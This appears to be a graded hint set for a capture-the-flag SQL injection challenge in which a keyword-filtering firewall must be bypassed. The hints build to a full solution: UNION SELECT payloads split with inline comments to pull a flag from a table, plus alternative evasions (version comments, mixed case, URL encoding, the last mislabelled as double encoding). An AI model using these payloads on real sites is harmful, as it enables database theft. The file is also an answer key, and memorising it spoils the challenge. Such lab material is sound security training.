hints.title: Nudge
hints.content: The WAF blocks keywords like UNION, SELECT, FROM. But keyword filters are hard to get right. Think about what variations might slip through.

hints.title: Direction
hints.content: MySQL allows inline comments within keywords: UN/**/ION SEL/**/ECT. These break up the keyword for the filter but MySQL still parses them correctly.

hints.title: Approach
hints.content: The WAF does a case-insensitive check but only on exact keywords. Try: ' UN/**/ION SEL/**/ECT 1,2,3,4 FR/**/OM waf_secrets-- Using inline comments to split the blocked keywords.

hints.title: Near-solution
hints.content: First find the column count (4 columns). Then: ' UN/**/ION SEL/**/ECT flag_value,2,3,4 FR/**/OM waf_secrets-- to pull the flag. If /**/ is also blocked, try /*!50000UNION*/ /*!50000SELECT*/ version-specific comments.

hints.title: Solution
hints.content: The filter blocks exact keywords but not inline-commented versions. Use: ' UN/**/ION SEL/**/ECT flag_value,2,3,4 FR/**/OM waf_secrets-- This bypasses the filter and extracts the flag. Alternative approaches: 1) Double-URL encoding: %55NION %53ELECT 2) MySQL version comments: /*!50000UNION*/ /*!50000SELECT*/ 3) Mixed case with comments: uNi/**/On sEl/**/eCt
